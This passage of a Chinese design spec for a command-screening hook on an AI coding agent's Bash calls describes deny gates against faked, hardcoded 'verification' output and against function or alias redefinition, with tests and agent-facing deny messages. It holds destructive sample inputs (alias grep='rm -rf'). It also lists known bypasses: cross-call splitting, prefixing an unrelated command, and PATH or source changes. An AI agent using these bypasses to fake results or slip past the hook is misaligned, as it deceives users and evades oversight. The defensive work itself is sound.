| `f(){:;}; echo 假` | **deny**（**閘②**）| 函式定義 → deny（**非** print 閘）|
| `echo(){:;}; echo 假` | **deny**（**閘②**）| 同上；遮蔽由閘② deny 處理 |
| `f(){:;}`（純函式定義）| **deny**（**閘②**）| 見 §3 no-op 交互 |
| `alias grep='rm -rf'; grep f` | **deny**（**閘②**）| alias 類名稱重定義 → deny |
| `shopt -s expand_aliases; alias cat=x; cat f` | **deny**（**閘②**）| 啟用 alias 展開＋定義 → deny |

判定在**階段 2、走訪整條指令之後**才做出（**非** per-leaf 短路）；命中時回 `{ kind }`，否則 `null`。唯一提前退出是
**fail-safe**：分析途中拋例外 → 由 `evaluate` 既有 try/catch 收斂為 ask（不 deny）。

### 4.5 閘③ 接線與 deny 理由

```ts
// 閘③（deny）：統一 print-only 載具偽裝——classify 前返回、不可升級
const hit = printDisguiseDeny(script, initialCwd);
if (hit) return { verdict: "deny", reason: printDisguiseDenyReason(hit.kind) };
```

- `printDisguiseDeny` 回 `null`（不 deny）或 `{ kind }`，`kind ∈ { "shell-print", "interp-inline", "write-exec",
  "cat-readback", "pipe" }`。**kind 決定性優先序**（使 deny reason 測試可預期）：`write-exec` > `cat-readback` >
  `pipe` > `interp-inline` > `shell-print`。
- `script`/`initialCwd` 皆 `evaluate` 既有；無新狀態穿透。**兩階段、走訪後才判**，不在途中提前回 deny。
- `printDisguiseDenyReason(kind)`（置於 `rules/types.ts`，取代舊 `printOnlyDenyReason`）：共用「**被禁的事＋原因＋
  替代**」骨架，依 kind 客製：
  - `shell-print`：「整條指令每段都只是 echo/printf/cat 印死字串…」
  - `interp-inline`：「你正用 `-e`/`-c`/`-p` 跑一段每行都只是 `console.log`/`print` 印死字串的程式…」
  - `write-exec`：「你先把寫死文字寫進暫存檔、再用直譯器執行同檔把它印出來…」
  - `cat-readback`：「你先把寫死文字寫進暫存檔、再 `cat` 讀回印出——與直接 echo 無異…」
  - `pipe`：「你把寫死文字 pipe 給直譯器印出來…」
  - 共同結尾：「內容完全寫死、沒讀檔沒計算——偽裝成跑出來的驗證結果。若已有結論請直接寫在回覆；若需查證請
    實際讀原始碼、跑會真正計算/讀檔的程式或真實測試。」

### 4.6 閘②（新）：name-redefinition 構造 → deny（函式定義＋alias 類）

本閘擋**函式與 alias 兩類名稱重定義構造**：(1) 函式定義；(2) alias 類（`alias`/`unalias`/`shopt -s expand_aliases`）。
任一命中即 deny，使閘③ print 與 classify 的 name-based 判定**不受函式/alias 遮蔽**。**範圍界定（回應 review high
finding）**：本閘**只**關閉函式/alias；bash 其他 command-resolution mutator（`hash -p`、`enable -n|-f`、`PATH`/
`export` 變更、`source`/`.` 匯入）**不在本閘範圍**——它們是全工具既有的 name-based 邊界（已落 classify/ask），
本 spec 不涵蓋、亦不惡化（§5 out-of-scope）。故本閘的價值是「消除函式/alias 這兩條**最常見**的名稱重定義」，
非「保證名稱解析絕對可信」。

```ts
// 閘②（deny）：name-redefinition 構造——classify 前返回、不可升級
if (hasExecutableFunctionDefinition(script)) {
  return { verdict: "deny", reason: nameRedefinitionDenyReason("function") };
}
if (hasAliasRedefinition(invocations)) {
  return { verdict: "deny", reason: nameRedefinitionDenyReason("alias") };
}
```

#### 4.6.1 函式定義（node-based、fail-closed）

- **判定用 node-based、fail-closed 的新 helper `hasExecutableFunctionDefinition(script)`（回應 review high
  finding）**，**非** name-based 的 `definedFunctionNames`：只要 AST 中存在**任一可執行位置的 `Function` 節點**
  即 `true`，**不依賴函式名是否可靜態還原**。這是安全關鍵——閘③ 的 name-based 判定「可信」的前提是「腳本無函式
  定義」；若改用 `definedFunctionNames(...).size > 0`（name-based）判定，一個**名稱無法靜態還原的 `Function`
  節點**會被漏收（size 可能為 0）→ fail-**open**、腳本帶著可重定義指令名的函式進入 print/classify pipeline，重新
  打開 trust-boundary 破口。故 deny 判定改用 node 存在性、fail-**closed**。
- **`hasExecutableFunctionDefinition(script)`（新，`walk.ts` 唯讀 helper，與 `definedFunctionNames` 同類、不改
  攤平/`CommandInvocation` 結構）**：沿 `definedFunctionNames` 的相同 AST 走訪（含循序序列、AndOr/Pipeline、
  subshell/BraceGroup、控制流 clause＋body、Statement、Coproc，以及 word 內 `$()`/`<()` 命令替換的內層腳本），
  遇到**第一個 `Function` 節點即回 `true`**（忽略其 name 能否 `staticValue`）；否則 `false`。
- **只涵蓋「可執行位置」（回應 review；已實測驗證，node 偵測與 name 偵測在此一致）**：`Function` 節點只出現在
  真正的函式定義與 `$()`/`<()` 內層腳本；heredoc/here-string 的**純文字 body**（引號 heredoc body 為 `undefined`、
  未引號純文字進 `content`，皆非 AST 命令）與**字串引數**內的函式語法**不是 `Function` 節點** → 不觸發。故
  **寫含函式的 shell script 不被 deny**——實測（`definedFunctionNames` 為空集，node 偵測亦無 `Function` 節點）：
  - `cat > deploy.sh <<'EOF'\ndeploy(){ … }\nEOF`、`cat > x.sh <<EOF\nf(){ … }\nEOF`、`echo 'f(){ echo hi; }'`
    → **不 deny**。
  - 對照真執行：`f(){ echo hi; }; f`、`f(){:;}`、`cat <<EOF\n$(g(){:;}; g)\nEOF` → 有 `Function` 節點 → **deny**。
- **`definedFunctionNames` 僅供診斷/測試**：deny 理由文字若要點名函式，可用 `definedFunctionNames` 取靜態名
  （動態名取不到時理由文字泛稱「shell 函式」即可）；**deny 決策不依賴它**。
- **對任何（可執行位置的）函式定義**（含未被呼叫、dead branch、`$()` 內、**動態名**）皆 deny。
- **接受的 over-deny（§1.2(3)）**：合法 `helper(){…}; helper`、dead branch 的函式定義亦 deny。使用者定案接受
  （agent 不該在 Bash 呼叫內定義函式；函式定義破壞 name-based 模型）。
- **fail-closed，無函式 under-deny**：改 node-based 後，**動態名函式定義亦被 deny**（不再是 under-deny 破口）；
  唯一不觸發者是「函式文字為資料」（非 `Function` 節點，本就不該 deny）。

#### 4.6.2 alias 類（name-based，回應 review high finding）

bash **alias** 同樣能重定義 allowlisted 指令名（`shopt -s expand_aliases; alias grep='rm -rf'; grep x`），與函式
同屬破壞 name-based 模型的機制。**使用者定案：一律 deny**。

- **`hasAliasRedefinition(invocations)`（新，純函式、以 walk 攤平的 `invocations[]` 判定，如同 sleep 閘的
  name-based 偵測）** → `true` 當任一葉指令：
  - `inv.name === "alias"` 或 `inv.name === "unalias"`（定義/移除 alias），**或**
  - `inv.name === "shopt"` 且其 argv 靜態值含 `-s`（set）與 `expand_aliases`（僅擋**啟用 alias 展開**的形式；
    `shopt -s globstar`、`shopt -u expand_aliases`（停用）、`shopt expand_aliases`（查詢）**不擋**）。
- **位置無關**：alias/unalias/shopt 出現在控制流/`$()`/subshell 內皆被 walk 攤平進 `invocations[]` → 一體偵測
  （與 sleep 閘同）。
- **「alias 文字為資料」不觸發**：`cat > setup.sh <<'EOF'\nalias grep=x\nEOF`（heredoc 資料）、`echo 'alias grep=x'`
  → alias 文字非葉指令 invocation → **不 deny**（寫含 alias 的 script 安全，與函式資料一致）。
- **動態指令名**（`inv.name === null`）→ 收不到 → under-deny（安全；與 sleep 閘同邊界）。

#### 4.6.3 deny 理由

- `nameRedefinitionDenyReason(kind)`（`rules/types.ts`；`kind ∈ {"function","alias"}`）：
  - `function`：「這個指令定義了 shell 函式（`name(){…}`）。函式可重定義任何指令名（如 `grep(){ rm -rf; }`）、
    使本工具的指令名安全分析失真，屬危險構造；在單次 Bash 呼叫內定義函式無正當常見理由。若需複用邏輯，請直接
    展開為具體指令、或拆成多次呼叫。」（點名函式可用 `definedFunctionNames` 取靜態名；動態名時泛稱「shell 函式」。）
  - `alias`：「這個指令用 `alias`/`unalias`/`shopt -s expand_aliases` 改變指令名的解析，可讓後續 `grep`/`cat` 等
    執行成別的東西、繞過本工具的指令名安全分析。請勿在 Bash 呼叫內設定 alias；直接用真實指令名。」
- **取代舊閘③「函式遮蔽 → ask」**：舊閘③ 僅在「被呼叫名恰被遮蔽」時 ask；新閘② 對**任何名稱重定義構造**皆 deny。

## 5. 邊界（皆已記錄）

- **跨 Bash 呼叫拆分**（呼叫1寫檔、呼叫2執行）：per-call 無狀態 → 不偵測。全工具所有 deny 共有的根本邊界、任務
  鎖定不變量。
  - **hook 從不自主放行**：呼叫2 `node /tmp/x.mjs`（裸 script 執行、當次無配對 WRITE）預設 ask（`node`/`python`
    不在 allowlist，已查證 `rules/allowlist.ts`）；唯使用者明確設 `Bash(node *)` 才升級 allow，屬使用者自負且與
    print 偽裝正交。**本功能不新增自主 allow 路徑**。
  - **為何不封（三修法皆違反鎖定不變量）**：(1) 跨呼叫持久 taint 違反 per-call 無狀態；(2) 讀檔內容違反「純詞法、
    永不碰檔案系統」不變量（且 TOCTOU、誤 deny 合法全 print 檔）；(3) 對「近期寫過的檔」抑制升級仍需跨呼叫狀態。
- **名稱重定義 → deny**（閘②，§4.6）：(1) 函式——任何可執行位置的 `Function` 節點即 deny（含 dead branch/`$()`
  內、**動態名**；node-based fail-closed）；(2) alias 類——`alias`/`unalias`/`shopt -s expand_aliases`（name-based）。
  接受 over-deny。唯一不觸發者是「文字為資料」（heredoc 純文字/字串引數，非 AST 節點/invocation → 不 deny，故
  shell-script 撰寫不受影響）。alias 動態指令名（`name===null`）→ under-deny（安全）。
- **其他 command-resolution mutator（既有 tool-wide 邊界、out-of-scope，回應 review high finding）**：
  `hash -p <path> <name>`、`enable -n <builtin>`/`enable -f`、`PATH`/`export PATH=` 變更、`source`/`.` 匯入
  定義——皆能改變後續指令名解析，但**非本閘涵蓋**。它們今天就落既有 classify/ask（非硬 deny，可被 settings
  影響），屬全工具的既有 name-based 邊界；本 spec **不引入亦不惡化**，僅明列。**不擴張到這些的理由**：清單近乎
  無窮，且 `export PATH=`/`source` 為極常見合法用法，硬 deny 會大量誤 deny（與 alias 的低誤殺不同）。使用者
  日後可另擇擴充特定 mutator。
- **控制流路徑不敏感**：clause/guard 與各分支納入同一葉集、覆蓋 (a) 施加於完整集；含 guard/多分支者通常 (a)
  失敗 → 不 deny（§4.4）。
- **exec-wrapper**（`timeout`/`command`/`env`/`nice`/`nohup`…）：葉名非載具 →（若鏈中尚有非載具葉）覆蓋 (a)
  失敗 → 落 ask。
- **賦值前綴**（`X=1 node …`）：跳過此葉、不視為載具。
- **會注入碼的旗標**（`-r`/`--require`/`--import`/`-m`/`--preload`/`--loader`/`--experimental-loader`）：跳過此葉。
- **不影響執行的良性旗標**（`--transpile-only`/`--allow-*`/`--experimental-*`…）：**無視、仍判定**（§4.3.3）。
- **WRITE→EXEC(a) 進入點含吃值/未知旗標**（`node --loader v runner.js`、`ts-node --project v runner.ts`…）：
  無法確定進入點 → 不成對、不 deny（fail-safe，寧 under-deny 不誤 deny；§4.3.2(a)/§4.3.3）。
- **繼承式 stdin**（bare `node` 無 fd0 重導向）、**動態 token**、**非緊鄰寫→執行**、**多段 pipeline**、`>>` append、
  背景寫入 → 不成對/非載具。
- 上述「不 deny」多落既有 ask、**可被** `settingsAllows` 升級——屬使用者自負既有 settings 行為；本功能不新增此
  路徑、亦不硬擋。被閘②/③ 命中者**不可**升級。

**誤 deny 面（近零、兩處具名 over-deny）**：§4.1 述詞 fail-safe；§4.4 聚合**兩階段、走訪完整鏈後才判**且要求每葉
皆載具/成員（任一非載具葉即令 (a) 失敗 → 不 deny，前綴載具不誤 deny）。**兩處刻意 over-deny**：(1) **名稱重定義**
（閘②，§4.6；函式定義＋alias 類）；(2) **cat 讀回複合載具**（§4.3.2(b)）。除此二者，本工具維持嚴格「絕不誤 deny」。

## 6. CLAUDE.md / 文件同步

- **「這是什麼」「核心不變量」**：deny **由三類擴為四類**——加入「④ 名稱重定義（函式定義＋alias 類）」
  （evaluate 層閘②、classify 前返回、不可升級）；「② 整鏈 print-only 偽裝」定義由「shell 層」**擴充為跨載具**
  （直譯器 inline/heredoc/pipe/寫檔→執行、cat 讀回兩步偽裝）。舊「函式遮蔽 → ask」（閘③）**升級為 deny**（新閘②）。
- **架構管線圖**：`閘① sleep → 閘② 名稱重定義（函式/alias）→ 閘③ 統一 print 載具 → classify`；模組列出
  `static_output.ts`／`interp_payload.ts`／改造後 `print_only.ts`（載具框架＋`printDisguiseDeny`）、
  `walk.ts` 新增唯讀 helper `hasExecutableFunctionDefinition`／`hasAliasRedefinition`。
- **「已接受繞道」**：
  - node/python/deno/bun/ts-node 的**裸 all-static-print 形態**（inline/heredoc/pipe/寫檔→執行）改**硬 deny**；
    含 wrapper/賦值前綴/注入旗標/跨呼叫者維持 ask（刻意 under-deny）。`bash -c`/`perl -e` 等仍 ask。
  - **兩步偽裝**（`cat > x <<EOF…EOF; cat x`）由「寫入重導向 ask」改**硬 deny**（cat 讀回複合載具）——註記為刻意
    接受的 over-deny narrow exception（詞法上與合法建檔＋讀回不可分、blast radius 限於冗餘讀回半段）。
  - **混載具全 print 鏈**（`echo a; node -e print`）改**硬 deny**。
  - **`ls; echo 假` / `ls; node -e print` 這類「整鏈含非載具葉」的洗白繞道維持不 deny**（(a) 失敗，落既有判定）。
    這是 **decision 2 明確鎖定的整鏈語意取捨**——寧讓「加一個無關真實/no-op 葉」洗白（降 ask、甚至可被 settings
    升級），也**不**採 per-leaf 硬 deny（那會誤殺極常見的 `ls; echo "done"`、`make && echo ok` 狀態訊息、違反
    「絕不誤 deny」）。**審查標記（重要）**：design-soundness reviewer 於 round 4（medium）、round 11（high/no-ship）
    **兩度**要求對此加硬 deny（per-leaf 或 dataflow 模型）；使用者於 round 11 **明確覆歸、維持全整鏈洗白**——因
    per-leaf 會大量誤 deny、dataflow 判定不可判定（`ls; echo "done"` 同樣無 dataflow → 仍誤殺）。此為**使用者
    定案接受的 under-deny**，非未審之疏漏。
  - **名稱重定義 → 硬 deny**（新）：明載其取代舊「函式遮蔽 → ask」、對任何函式定義（含 dead branch/`$()` 內）
    及 alias 類（`alias`/`unalias`/`shopt -s expand_aliases`）皆 deny，屬刻意接受的 over-deny（破壞 name-based
    模型的危險結構）。
- **既有「函式遮蔽 → ask」記述**：改為「名稱重定義（函式/alias）→ deny」。

## 7. 測試與「誤 deny」稽核

### 7.1 純 shell 鏈回歸（`print_only_test.ts` 既有案例，除函式相關）
- **保留不變**：`echo a; echo b`、`printf '…'`、`cat <<'EOF'…EOF`、洗白鏈（`ls; echo 假`、`pwd; echo 假`、
  `true && echo x`、`mkdir build && echo done`）、echo `-e`＋反斜線 carve-out、printf 格式化轉換符 carve-out、
  cat 檔案操作元/fd0 最後者勝等。
- **名稱重定義相關案例改斷言**：凡含函式定義或 alias 類者改為斷言 **deny（閘②）**——見 §7.5。

### 7.2 述詞（`interp_payload_test.ts`）
- deny：多行 `console.log("…")`/`print("…")`、註解＋print、三引號/無 `${}` 模板、數字字面量、多字面量逗號、
  `console.error`/`process.stdout.write` 變體。
- 不-deny：`console.log(1+1)`、`"a"+"b"`、`JSON.stringify(x)`、`sorted`、`json.dumps`、變數、`${}` 模板、
  f-string、`import`/`if`/`for`、未閉合括號/引號、空 payload、`console.log()`、`print("x",end="")`、資源上限超標。
- write API STRING-only：`process.stdout.write("fake")` deny；`process.stdout.write(42)`/`sys.stdout.write(1)` 不 deny。
- `printExprIsStaticString`：`'"fake"'` true；`'1+1'`/`'os.cpus()'` false。

### 7.3 靜態輸出還原（`static_output_test.ts`）
- `echoOutput`/`printfOutput`/`commandOutput` 對合格 → 具體字串、不合格 → `null`（格式化轉換符、動態、append、
  有檔案操作元等）。
- **tac 行反轉**：`commandOutput` 對 `tac <<'EOF'\nA\nB\nEOF` → `"B\nA"`（反序）；`cat` 同 body → `"A\nB"`（原序）。

### 7.4 print 閘③ 載具/聚合整合測試（`print_only_test.ts` 新增段；以下皆**無函式定義**）
- **葉載具 inline（A）**：裸 `node -e '<print>'`/`python -c '<print>'`/`deno eval '<print>'`/`bun -e`/`ts-node -e`、
  `node -p '"fake"'` → deny；含運算 `node -e '1+1…'`、`node -p '1+1'`/`os.cpus()` → 不 deny。
  - **已知 nullary 旗標之後仍 deny**：`node --no-warnings -e '<print>'`、`ts-node --transpile-only -e '<print>'` → deny。
  - **分離值/未知旗標 → 放棄、不 deny（回應 review medium finding，須斷言不 deny）**：`node --title -e 'console.log("x")'`
    （`--title` 非已知 nullary、可能吃走 `-e` → 放棄 inline 定位）、`node --unknown-flag val -e '<print>'` → **不 deny**
    （保守 arity 避免把旗標值誤當 `-e` 標記而誤 deny）。
- **葉載具 heredoc-stdin（B）**：裸 `node <<'EOF'<print>EOF`/`python <<'EOF'`/`deno run -`/`bun run -` → deny；
  `< file`/無 fd0（繼承）→ 不 deny。
- **複合 WRITE→EXEC(a)**：旗艦 `cat > /tmp/x.mjs <<'EOF'<print>EOF; node /tmp/x.mjs` → deny；`&&` 緊鄰 → deny；
  `echo '<print>' > f; node f` → deny。
  - **進入點負面——P 是程式 argv（須斷言不 deny）**：`echo 'console.log("fixture")' > fixture.js;
    node runner.js fixture.js`、`printf '…' > fixture.py; python runner.py fixture.py`、`echo '<print>' > f.ts;
    deno run runner.ts f.ts` → **不 deny**（P≠進入點）。
  - **進入點負面——P 是吃值旗標的值（回應 review high finding，須斷言不 deny）**：`echo 'console.log("x")' > fixture.js;
    node --loader fixture.js runner.js`、`... > cfg.json; ts-node --project cfg.json runner.ts`、
    `... > im.json; deno run --import-map im.json runner.ts` → **不 deny**（`--loader`/`--project`/`--import-map`
    非已知 nullary → 放棄進入點定位，即使 fixture/cfg/im 為前驅 WRITE）。
  - **進入點正面——已知 nullary/黏值旗標仍 deny**：`ts-node --transpile-only x.ts`（x.ts=前驅 all-print WRITE）、
    `node --experimental-default-type=module x.mjs`（`=value` 形）、`deno run --allow-read x.ts`（裸 allow 已知
    nullary）、`node --no-warnings x.mjs` → **deny**（旗標可確定跳過量、x=進入點=P）。
- **複合 WRITE→EXEC(b) cat 讀回**：`cat > /tmp/q.txt <<'EOF'<任意靜態文字>EOF; cat /tmp/q.txt` → deny；
  `printf '…' > q; tac q` → deny。**不 deny 面**：非緊鄰（`cat > q; echo hi; cat q`）、非同檔（`cat > a; cat b`）、
  append（`cat >> q <<EOF…EOF; cat q`）、跨控制流（`if c; then cat > q; fi; cat q`）。
  - **accepted over-deny（§4.3.2(b)，須斷言 deny 並註記為刻意例外）**：合法 `cat > config.yaml <<'EOF'\n<yaml>\nEOF;
    cat config.yaml` → **deny**。**緩解對照**：單獨 `cat > config.yaml <<'EOF'\n<yaml>\nEOF`（無讀回）→ **非閘③
    deny**（落寫入重導向 ask、可核准），驗證檔案建立未被永久阻擋。
- **setup 豁免**：`mkdir -p /tmp && cat > x <<EOF…EOF && node x` → deny；`cd /tmp; cat > x; node x` → deny；
  對照 `mkdir build && echo done`、`true && echo 已驗證` → **不 deny**（無 composite → 不吃豁免）。
- **`! true` 排除**：`! true && cat > x <<EOF…EOF && node x` → 不 deny；對照 `false && cat > x && node x` → 不 deny。
- **混載具全 print 鏈（新增 deny）**：`echo a; node -e 'console.log("b")'` → deny；對照 `ls; node -e
  'console.log("假")'` → 不 deny（ls 非載具，(a) 失敗）。
- **兩階段前綴 false-deny**：`echo 假; ls`、`node -e 'console.log("x")'; ls`、`echo a; echo b; ls` → **不 deny**；
  對照 `echo a; echo b` → deny。
- **控制流路徑不敏感**：`if command -v node; then node -e 'console.log("fake")'; else echo 假; fi` → 不 deny；
  `if true; then echo 假; fi` → 不 deny；對照 `for x in a b; do echo 假; done` → deny。
- **pipe（D）＋覆蓋契約**：`echo 'console.log(1)' | node` → deny（node 經 pipe 成對標為 `複合成員:pipe`）；
  對照 `node`（裸、非 pipe）落 ask（consumer 未成對→非載具）、`grep x f | node`/三段 → 不 deny、
  `echo … | node < real.js`（fd0 蓋過）→ 不 deny。
- **良性旗標仍 deny（inline A；WRITE→EXEC(a) 的進入點旗標案例見上「複合 WRITE→EXEC(a)」）**：
  `node --no-warnings -e 'console.log("fake")'`、`ts-node --transpile-only -e '<print>'` → deny（inline payload
  偵測無視良性旗標、仍判定）。

### 7.5 name-redefinition 閘② 測試（新，`print_only_test.ts` 或 `evaluate_test.ts`）
- **函式 deny 面**：`f(){ :; }; echo 假`、`echo(){:;}; echo 假`、`node(){:;}; node -e '…'`、`f(){:;}`（純定義）、
  `g(){ ls; }; g`（合法複用亦 deny，accepted over-deny）、`ls -la; ls(){…}`（原閘③ 為 ask，改 deny）、
  dead branch `if false; then f(){:;}; fi; echo hi`（AST 有 `Function` 節點 → deny）、
  `echo "$(f(){:;}; f)"`（`$()` 內函式定義 → deny）、**動態名 `Function` 節點若可構造 → deny**（node-based
  fail-closed，不依賴靜態名還原）。
- **不 deny 面——「函式文字為資料」不誤觸（回應 review high finding，關鍵回歸；已實測 `definedFunctionNames` 為空集）**：
  - **寫含函式的 shell script**：`cat > deploy.sh <<'EOF'\ndeploy(){ … }\nEOF`（引號 heredoc）、
    `cat > x.sh <<EOF\nf(){ … }\nEOF`（未引號、無 `$()`）→ **不 deny**（heredoc 純文字非可執行函式定義；
    此為極常見合法工作流，**必須**不 deny）。註：此二例為「寫檔」——落中央前置**寫入重導向 ask**（非閘②/③ deny）。
  - **字串引數**：`echo 'f(){ echo hi; }'`、`printf '%s\n' 'g(){:;}'` → **不 deny**（字串資料非函式定義）。
  - 注意：這些是**資料**（無 `Function` 節點）故不 deny；與「動態名 `Function` 節點 → deny」不同（後者有節點）。
- **alias 類 deny 面**：`alias grep='rm -rf'; grep x`、`shopt -s expand_aliases; alias cat=x; cat f`、
  `unalias -a`、`alias`（列出形，accepted 小 over-deny）、`if true; then alias a=b; fi`（`$()`/控制流內亦攤平偵測）→ **deny**、
  reason `alias`。
- **alias 類不 deny 面**：`shopt -s globstar`、`shopt -u expand_aliases`（停用）、`shopt expand_aliases`（查詢）→
  **不 deny**（非啟用 alias 展開）；`cat > setup.sh <<'EOF'\nalias grep=x\nEOF`、`echo 'alias grep=x'` → **不 deny**
  （alias 文字為資料、非 invocation；寫含 alias 的 script 安全）。
- **理由**：deny reason 為 `nameRedefinitionDenyReason("function")` / `nameRedefinitionDenyReason("alias")`。

### 7.6 不可升級 e2e（`main_test.ts`）
- settings 含 `Bash(node *)`/`Bash(python *)`/`Bash(echo *)`：print 載具 A/B/C(a)/C(b)/D（**單一呼叫、無函式**）
  仍 deny；函式定義 `Bash(bash *)` 等亦無法解除閘② deny；對照 `node -e 'JSON.stringify(x)'` → allow。
- **跨呼叫拆分 / migration 邊界**：呼叫1 `cat > /tmp/x.mjs <<EOF…EOF` → ask；呼叫2 `node /tmp/x.mjs` **無**
  `Bash(node *)` → ask；retry 仍 ask；`node /tmp/x.mjs`＋`Bash(node *)` → allow（使用者自負）。對照**同一 payload
  單一呼叫內** `cat > /tmp/x.mjs <<EOF…EOF; node /tmp/x.mjs`＋`Bash(node *)` → 仍 deny。

### 7.7 Operational verification（build 後）
- 兩步偽裝 `cat > /tmp/research_query.txt << 'EOF'\n<多行靜態文字>\nEOF\ncat /tmp/research_query.txt` → 期望
  **deny**、`exit 0`、reason `cat-readback`。
- 直譯器痛點 `cat > /tmp/verify.mjs <<'EOF'…全 console.log…EOF` 接 `node /tmp/verify.mjs` → **deny**、reason `write-exec`。
- 函式定義 `f(){ :; }; echo done` → **deny**、reason `nameRedefinitionDenyReason("function")`。
- alias `alias grep=x; grep foo` → **deny**、reason `nameRedefinitionDenyReason("alias")`；`shopt -s globstar; echo hi`
  的 shopt 不觸發 alias 閘（惟 `echo hi` 若整鏈 print 另議）。
- 真實運算 `node -e 'console.log(1+1)'` → **非 deny**。

### 7.8 全綠
`deno task check && deno task lint && deno task test`。

## 8. 風險與邊界

- **詞法器 fragility**：手寫 tokenizer 對冷僻字串逸脫/多行構造可能誤判——fail-safe，誤判方向恆為「不 deny」。
- **效能**：閘③ 對每次 Bash 呼叫多一趟 source-order 走訪＋（命中時）極小詞法；payload 短，O(指令長度)。閘② 為
  一次 `hasExecutableFunctionDefinition` 掃描（遇首個 `Function` 節點即短路）＋ `hasAliasRedefinition`
  （掃 `invocations[]` name），皆 O(AST/葉數)。
- **跨呼叫拆分 × `settingsAllows`（意識接受）**：WRITE 與 EXEC 拆到兩次呼叫時 deny 消失；配 `Bash(node *)` 呼叫2
  升級 allow。此為兩條鎖定不變量（per-call 無狀態、純詞法不讀檔）的交集、非本功能引入的漏洞；封閉需 taint/讀檔
  （違反不變量）故不做。緩解：hook 自主預設 ask、單呼叫內硬 deny 不可升級、使用者對 `Bash(node *)` 自負。
- **其他 command-resolution mutator out-of-scope（收窄不變量，回應 review high finding）**：`hash -p`、
  `enable -n|-f`、`PATH`/`export PATH=`、`source`/`.` 匯入——皆能改變名稱解析，但**非閘② 涵蓋**、落既有 classify/ask。
  閘② 的可信性**僅相對函式/alias**、非普遍保證（§4.4 前提、§4.6、§5）。不擴張理由：清單近乎無窮、且 PATH/source
  硬 deny 誤殺面大。屬既有 tool-wide 邊界、本 spec 不惡化。
- **兩處 accepted over-deny**（觸及「絕不誤 deny」）：
  - **名稱重定義 → deny**（§4.6）：**函式**僅限可執行位置（真 `Function` 節點＋`$()`/`<()` 內、node-based
    fail-closed）；**alias 類**為 `alias`/`unalias`/`shopt -s expand_aliases`（name-based）。合法 `helper(){…};
    helper`、`alias` 列出形亦 deny。使用者定案（agent 不該在 Bash 呼叫內定義函式或設 alias；皆破壞 name-based
    模型）。**不涵蓋**「文字為資料」——寫含函式/alias 的 shell script（`cat > x.sh <<'EOF'…f(){}…alias a=b…EOF`）、
    字串引數（`echo 'f(){}'`）**不被 deny**（已實測，§4.6/§7.5），故此 over-deny 不波及 shell-script 撰寫。
  - **cat 讀回複合載具**（§4.3.2(b)）：詞法上等同合法「建靜態檔＋讀回」；blast radius 限於冗餘讀回半段（檔案
    建立可另起呼叫核准）。
- **刻意接受的 under-deny**：跨呼叫拆分、控制流包裝（路徑不敏感）、exec-wrapper、賦值前綴、注入旗標、非緊鄰
  寫→執行、繼承 stdin、多段 pipe、**WRITE→EXEC(a) 進入點前含吃值/未知旗標**（§4.3.2(a) fail-safe 放棄定位，
  避免把旗標值誤當進入點而誤 deny）。皆安全方向、不防刻意繞過。（**函式定義已改 node-based fail-closed，動態名亦
  deny、不在此列**。）
- **整鏈洗白 under-deny（使用者明確覆歸 review，§6）**：`ls; node -e '假'`、`ls; echo 假`、`pwd; echo 假` 加一個
  非載具葉即不 deny（落既有 ask/settings）。design-soundness reviewer 兩度（round 4/11）要求硬 deny；使用者定案
  維持整鏈語意（per-leaf 會誤殺 `ls; echo "done"`、dataflow 不可判定）。屬 decision 2 鎖定之刻意 under-deny、
  非疏漏；本 hook 回 ask 時仍不放行，安全由 Claude Code 端與使用者核准把關。
- **無回歸**：`f(){:;}; echo 假` 舊閘② 為 deny、本版經閘② 仍 deny（reason 改為函式定義）——**非回歸**。舊閘③
  「函式遮蔽 → ask」升級為 deny 屬**收緊**（`ls -la; ls(){…}` 由 ask 改 deny）。除上述兩處 over-deny 外，本版
  只擴充 deny、不放寬。
